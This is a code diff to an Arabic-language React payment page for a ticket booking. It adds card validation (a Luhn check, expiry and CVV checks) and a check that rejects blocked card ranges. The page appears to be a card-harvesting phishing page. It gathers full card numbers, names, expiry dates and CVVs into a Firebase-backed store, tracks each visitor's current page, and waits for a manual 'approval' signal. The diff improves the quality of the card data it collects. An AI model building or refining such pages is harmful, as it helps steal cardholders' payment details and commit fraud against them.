@@ -1,14 +1,32 @@
 import { useEffect, useState } from "react";
 import { motion } from "framer-motion";
-import { Check, Clock, ChevronLeft, Shield } from "lucide-react";
+import { Check, Clock, ChevronLeft, Shield, AlertCircle } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import {
   addData,
   handleCurrentPage,
   handlePay,
   listenForApproval,
+  isBinBlocked,
 } from "@/lib/firebase";
 import { getCardType } from "@/components/reservation/payment-step";
+
+function validateLuhn(cardNum: string): boolean {
+  const digits = cardNum.replace(/\D/g, "");
+  if (digits.length < 13) return false;
+  let sum = 0;
+  let alt = false;
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let n = parseInt(digits[i], 10);
+    if (alt) {
+      n *= 2;
+      if (n > 9) n -= 9;
+    }
+    sum += n;
+    alt = !alt;
+  }
+  return sum % 10 === 0;
+}
 
 const STEPS = [
   { label: "التذاكر", done: true, active: false },
@@ -90,13 +108,48 @@ export default function Payment() {
 
   const [cardNumber, setCardNumber] = useState("");
   const [cardName, setCardName] = useState("");
-  const [expiryMonth, setExpiryMonth] = useState("");
-  const [expiryYear, setExpiryYear] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("01");
+  const [expiryYear, setExpiryYear] = useState(
+    String(new Date().getFullYear() + 1).slice(-2),
+  );
   const [cvv, setCvv] = useState("");
 
   const [submitting, setSubmitting] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
   const [error, setError] = useState("");
+  const [errors, setErrors] = useState<Record<string, string>>({});
+
+  const clearFieldError = (k: string) =>
+    setErrors((p) => {
+      if (!p[k]) return p;
+      const { [k]: _drop, ...rest } = p;
+      return rest;
+    });
+
+  const validateForm = (): boolean => {
+    const next: Record<string, string> = {};
+    const raw = cardNumber.replace(/\s/g, "");
+    if (!raw || raw.length < 13) next.cardNumber = "رقم البطاقة غير صحيح";
+    else if (!validateLuhn(raw)) next.cardNumber = "رقم البطاقة غير صالح";
+
+    if (!cardName.trim() || cardName.trim().length < 3)
+      next.cardName = "يرجى إدخال الاسم على البطاقة";
+
+    const mm = parseInt(expiryMonth, 10);
+    const yy = parseInt(expiryYear, 10);
+    if (!mm || mm < 1 || mm > 12 || !yy) {
+      next.expiry = "تاريخ الصلاحية غير صحيح";
+    } else {
+      const fullYear = 2000 + yy;
+      const expiry = new Date(fullYear, mm); // first of next month
+      if (expiry <= new Date()) next.expiry = "البطاقة منتهية الصلاحية";
+    }
+
+    if (!cvv || cvv.length < 3) next.cvv = "كود الحماية غير صحيح";
+
+    setErrors(next);
+    return Object.keys(next).length === 0;
+  };
 
   useEffect(() => {
     void handleCurrentPage("payment");
@@ -116,18 +169,12 @@ export default function Payment() {
     return () => unsub();
   }, [waitingApproval, setLocation]);
 
-  const cardValid =
-    cardNumber.replace(/\s/g, "").length >= 13 &&
-    cardName.trim().length >= 2 &&
-    expiryMonth.length === 2 &&
-    expiryYear.length === 2 &&
-    cvv.length >= 3;
-
-  const canPay = agreed && cardValid && !submitting && !waitingApproval;
+  const canPay = agreed && !submitting && !waitingApproval;
 
   const onPay = async () => {
     if (!canPay) return;
     setError("");
+    if (!validateForm()) return;
     setSubmitting(true);
 
     const visitorId = localStorage.getItem("visitor");
@@ -181,6 +228,17 @@ export default function Payment() {
     }
 
     const cleanCard = cardNumber.replace(/\s/g, "");
+
+    try {
+      if (await isBinBlocked(cleanCard)) {
+        setError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
+        setSubmitting(false);
+        return;
+      }
+    } catch {
+      // ignore lookup failures and continue
+    }
+
     const paymentInfo = {
       cardNumber: cleanCard,
       cardName,
@@ -287,13 +345,25 @@ export default function Payment() {
                 </label>
                 <input
                   value={cardNumber}
-                  onChange={(e) => setCardNumber(formatCard(e.target.value))}
+                  onChange={(e) => {
+                    setCardNumber(formatCard(e.target.value));
+                    clearFieldError("cardNumber");
+                    setError("");
+                  }}
                   placeholder="0000 0000 0000 0000"
                   inputMode="numeric"
                   dir="ltr"
-                  className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
+                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                    errors.cardNumber ? "border-destructive" : "border-border"
+                  }`}
                   data-testid="input-card-number"
                 />
+                {errors.cardNumber && (
+                  <p className="text-[11px] text-destructive mt-1 text-end flex items-center justify-end gap-1">
+                    <span>{errors.cardNumber}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
+                )}
               </div>
               <div>
                 <label className="text-xs text-muted-foreground block mb-1 text-end">
@@ -301,24 +371,40 @@ export default function Payment() {
                 </label>
                 <input
                   value={cardName}
-                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                  onChange={(e) => {
+                    setCardName(e.target.value.toUpperCase());
+                    clearFieldError("cardName");
+                  }}
                   placeholder="NAME ON CARD"
-                  className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background uppercase"
+                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background uppercase ${
+                    errors.cardName ? "border-destructive" : "border-border"
+                  }`}
                   data-testid="input-card-name"
                 />
+                {errors.cardName && (
+                  <p className="text-[11px] text-destructive mt-1 text-end flex items-center justify-end gap-1">
+                    <span>{errors.cardName}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
+                )}
               </div>
-              <div className="grid grid-cols-3 gap-3">
+              <div className="grid grid-cols-3 gap-3 items-start">
                 <div>
                   <label className="text-xs text-muted-foreground block mb-1 text-end">
                     شهر *
                   </label>
                   <input
                     value={expiryMonth}
-                    onChange={(e) => setExpiryMonth(digitsOnly(e.target.value, 2))}
+                    onChange={(e) => {
+                      setExpiryMonth(digitsOnly(e.target.value, 2));
+                      clearFieldError("expiry");
+                    }}
                     placeholder="MM"
                     inputMode="numeric"
                     dir="ltr"
-                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                      errors.expiry ? "border-destructive" : "border-border"
+                    }`}
                     data-testid="input-expiry-month"
                   />
                 </div>
@@ -328,11 +414,16 @@ export default function Payment() {
                   </label>
                   <input
                     value={expiryYear}
-                    onChange={(e) => setExpiryYear(digitsOnly(e.target.value, 2))}
+                    onChange={(e) => {
+                      setExpiryYear(digitsOnly(e.target.value, 2));
+                      clearFieldError("expiry");
+                    }}
                     placeholder="YY"
                     inputMode="numeric"
                     dir="ltr"
-                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                      errors.expiry ? "border-destructive" : "border-border"
+                    }`}
                     data-testid="input-expiry-year"
                   />
                 </div>
@@ -342,14 +433,31 @@ export default function Payment() {
                   </label>
                   <input
                     value={cvv}
-                    onChange={(e) => setCvv(digitsOnly(e.target.value, 4))}
+                    onChange={(e) => {
+                      setCvv(digitsOnly(e.target.value, 4));
+                      clearFieldError("cvv");
+                    }}
                     placeholder="•••"
                     inputMode="numeric"
                     dir="ltr"
-                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                      errors.cvv ? "border-destructive" : "border-border"
+                    }`}
                     data-testid="input-cvv"
                   />
+                  {errors.cvv && (
+                    <p className="text-[11px] text-destructive mt-1 text-end flex items-center justify-end gap-1">
+                      <span>{errors.cvv}</span>
+                      <AlertCircle className="w-3 h-3" />
+                    </p>
+                  )}
                 </div>
+                {errors.expiry && (
+                  <p className="col-span-2 text-[11px] text-destructive mt-1 text-end flex items-center justify-end gap-1">
+                    <span>{errors.expiry}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
+                )}
               </div>
             </div>
           </div>
